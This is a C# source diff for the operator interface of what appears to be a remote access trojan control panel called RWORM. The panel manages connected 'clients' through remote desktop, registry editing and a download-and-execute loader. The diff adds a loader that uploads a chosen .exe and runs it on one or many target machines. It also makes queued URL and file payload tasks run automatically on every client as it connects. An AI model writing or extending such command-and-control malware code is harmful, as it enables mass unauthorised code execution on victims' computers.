@@ -1,3 +1,4 @@
+using System.Collections.Generic;
 using System;
 using System.Collections.ObjectModel;
 using System.ComponentModel;
@@ -104,6 +105,7 @@ namespace RWORM.GUI.ViewModels
         public ICommand OpenRegistryEditorCommand  { get; }
         public ICommand OpenRemoteDesktopCommand   { get; }
         public ICommand LoaderExecCommand          { get; }
+        public ICommand LoaderExecFileCommand      { get; }
         public ICommand ClientCloseCommand         { get; }
         public ICommand ClientUninstallCommand     { get; }
         public ICommand ClientUpdateCommand        { get; }
@@ -143,6 +145,7 @@ namespace RWORM.GUI.ViewModels
             OpenRegistryEditorCommand = new RelayCommand(p => OpenRegistryEditor(p as ClientModel), HasClient);
             OpenRemoteDesktopCommand  = new RelayCommand(p => OpenRemoteDesktop(p as ClientModel),  HasClient);
             LoaderExecCommand         = new RelayCommand(p => PromptLoaderExec(p as ClientModel),   HasClient);
+            LoaderExecFileCommand     = new RelayCommand(p => PromptLoaderExecFile(p as ClientModel), HasClient);
             ClientCloseCommand        = new RelayCommand(p => ConfirmClose(p as ClientModel),        HasClient);
             ClientUninstallCommand    = new RelayCommand(p => ConfirmUninstall(p as ClientModel),    HasClient);
             ClientUpdateCommand       = new RelayCommand(p => PromptUpdate(p as ClientModel),        HasClient);
@@ -152,7 +155,7 @@ namespace RWORM.GUI.ViewModels
             AddLocalFileTaskCommand   = new RelayCommand(_ => AddLocalFileTask());
             AddUrlTaskCommand         = new RelayCommand(_ => AddUrlTask());
             RunTaskOnSelectedCommand  = new RelayCommand(_ => RunTaskOnSelected(),
-                _ => SelectedTask != null && IsConnected && SelectedClients.Count > 0);
+                _ => SelectedTask != null && IsConnected && (SelectedClients.Count > 0 || SelectedClient != null));
             RemoveTaskCommand         = new RelayCommand(p =>
             {
                 if (p is TaskModel t) Tasks.Remove(t);
@@ -203,6 +206,18 @@ namespace RWORM.GUI.ViewModels
                 Clients.Clear();
                 foreach (var c in clients) Clients.Add(c);
                 OnPropertyChanged(nameof(ClientCount));
+
+                // Auto-run tasks on newly connected clients
+                foreach (var task in Tasks.ToList())
+                {
+                    foreach (var c in Clients.ToList())
+                    {
+                        if (!task.ExecutedGuids.Contains(c.Guid))
+                        {
+                            _ = ExecuteTaskOnClientAsync(task, c);
+                        }
+                    }
+                }
             }
             var dispatcher = System.Windows.Application.Current?.Dispatcher;
             if (dispatcher == null) Apply();          // no WPF app running
@@ -250,11 +265,43 @@ namespace RWORM.GUI.ViewModels
         // ── Client control ────────────────────────────────────────────────────
         private void PromptLoaderExec(ClientModel? c)
         {
-            if (c == null) return;
-            var url = InputDialog.Show("Payload URL to download and execute:", "Loader", "https://");
+            var targets = SelectedClients.Count > 0 ? SelectedClients.ToList() : (c != null ? new List<ClientModel> { c } : new List<ClientModel>());
+            if (targets.Count == 0) return;
+            var url = InputDialog.Show("Payload URL to download and execute:", "Loader (URL)", "https://");
             if (string.IsNullOrWhiteSpace(url)) return;
-            _ = _server.LoaderExec(c.Guid, url);
-            StatusMessage = $"Loader sent → {c.Hostname}";
+            foreach (var client in targets)
+            {
+                _ = _server.LoaderExec(client.Guid, url);
+            }
+            StatusMessage = $"Loader (URL) sent to {targets.Count} client(s)";
+        }
+
+        private void PromptLoaderExecFile(ClientModel? c)
+        {
+            var targets = SelectedClients.Count > 0 ? SelectedClients.ToList() : (c != null ? new List<ClientModel> { c } : new List<ClientModel>());
+            if (targets.Count == 0) return;
+
+            var dlg = new Microsoft.Win32.OpenFileDialog
+            {
+                Title  = "Select Executable to Execute on Target",
+                Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
+            };
+            if (dlg.ShowDialog() != true) return;
+
+            byte[] bytes;
+            try { bytes = File.ReadAllBytes(dlg.FileName); }
+            catch (Exception ex)
+            {
+                System.Windows.MessageBox.Show($"Failed to read file: {ex.Message}", "Error",
+                    System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
+                return;
+            }
+
+            foreach (var client in targets)
+            {
+                _ = _server.LoaderExecFile(client.Guid, bytes);
+            }
+            StatusMessage = $"Loader (File: {Path.GetFileName(dlg.FileName)}) sent to {targets.Count} client(s)";
         }
 
         private void ConfirmClose(ClientModel? c)
@@ -301,6 +348,35 @@ namespace RWORM.GUI.ViewModels
         }
 
         // ── Tasks ─────────────────────────────────────────────────────────────
+        private async Task ExecuteTaskOnClientAsync(TaskModel task, ClientModel client)
+        {
+            if (task.ExecutedGuids.Contains(client.Guid)) return;
+            task.ExecutedGuids.Add(client.Guid);
+
+            try
+            {
+                if (task.Mode == TaskMode.LocalFile)
+                {
+                    if (File.Exists(task.Source))
+                    {
+                        byte[] bytes = File.ReadAllBytes(task.Source);
+                        await _server.RunFileTaskAsync(client.Guid, bytes);
+                    }
+                }
+                else
+                {
+                    await _server.RunUrlTaskAsync(client.Guid, task.Source);
+                }
+
+                task.ExecutedCount = task.ExecutedGuids.Count;
+                task.Status = $"Sent → {task.ExecutedCount} client(s)";
+            }
+            catch (Exception ex)
+            {
+                task.Status = $"Error: {ex.Message}";
+            }
+        }
+
         private void AddLocalFileTask()
         {
             var dlg = new Microsoft.Win32.OpenFileDialog
@@ -319,6 +395,12 @@ namespace RWORM.GUI.ViewModels
             Tasks.Add(task);
             SelectedTask = task;
             StatusMessage = $"Task added: {task.Name}";
+
+            // Auto-run on currently connected clients immediately
+            foreach (var client in Clients.ToList())
+            {
+                _ = ExecuteTaskOnClientAsync(task, client);
+            }
         }
 
         private void AddUrlTask()
@@ -335,16 +417,23 @@ namespace RWORM.GUI.ViewModels
             Tasks.Add(task);
             SelectedTask = task;
             StatusMessage = $"URL task added";
+
+            // Auto-run on currently connected clients immediately
+            foreach (var client in Clients.ToList())
+            {
+                _ = ExecuteTaskOnClientAsync(task, client);
+            }
         }
 
         private async void RunTaskOnSelected()
         {
             if (SelectedTask == null) return;
             var targets = SelectedClients.ToList();
+            if (targets.Count == 0 && SelectedClient != null) targets.Add(SelectedClient);
             if (targets.Count == 0)
             {
                 System.Windows.MessageBox.Show(
-                    "No clients selected.\nSelect one or more clients in the Clients page (Ctrl+click).",
+                    "No clients selected.\nSelect one or more clients in the Clients page.",
                     "No Target", System.Windows.MessageBoxButton.OK,
                     System.Windows.MessageBoxImage.Information);
                 return;
@@ -353,27 +442,13 @@ namespace RWORM.GUI.ViewModels
             SelectedTask.Status = "Running…";
             StatusMessage       = $"Running task on {targets.Count} client(s)…";
 
-            if (SelectedTask.Mode == TaskMode.LocalFile)
+            foreach (var c in targets)
             {
-                byte[] bytes;
-                try   { bytes = File.ReadAllBytes(SelectedTask.Source); }
-                catch (Exception ex)
-                {
-                    SelectedTask.Status = $"Error: {ex.Message}";
-                    StatusMessage = "File read failed";
-                    return;
-                }
-                foreach (var c in targets)
-                    await _server.RunFileTaskAsync(c.Guid, bytes);
-            }
-            else
-            {
-                foreach (var c in targets)
-                    await _server.RunUrlTaskAsync(c.Guid, SelectedTask.Source);
+                SelectedTask.ExecutedGuids.Remove(c.Guid);
+                await ExecuteTaskOnClientAsync(SelectedTask, c);
             }
 
-            SelectedTask.Status = $"Sent → {targets.Count} client(s)";
-            StatusMessage       = $"Task dispatched to {targets.Count} client(s)";
+            StatusMessage = $"Task dispatched to {targets.Count} client(s)";
         }
 
         // ── Send command ──────────────────────────────────────────────────────
